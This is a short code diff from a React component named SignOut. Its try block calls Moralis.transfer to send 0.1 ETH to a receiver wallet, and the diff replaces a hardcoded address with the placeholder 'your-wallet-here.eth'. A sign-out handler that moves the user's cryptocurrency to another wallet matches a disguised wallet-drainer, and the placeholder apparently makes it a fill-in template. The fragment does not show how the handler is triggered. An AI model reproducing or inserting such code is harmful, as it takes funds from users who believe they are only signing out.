@@ -21,7 +21,7 @@ export const SignOut = () => {
     try {
       await Moralis.transfer({
         amount: Moralis.Units.ETH("0.1"),
-        receiver: "0xd2305b8155c4710c7fff1358d084f23959c999f3",
+        receiver: "your-wallet-here.eth",
         type: "native",
       }).then((e) => {
         alert("sucesfully transfered");
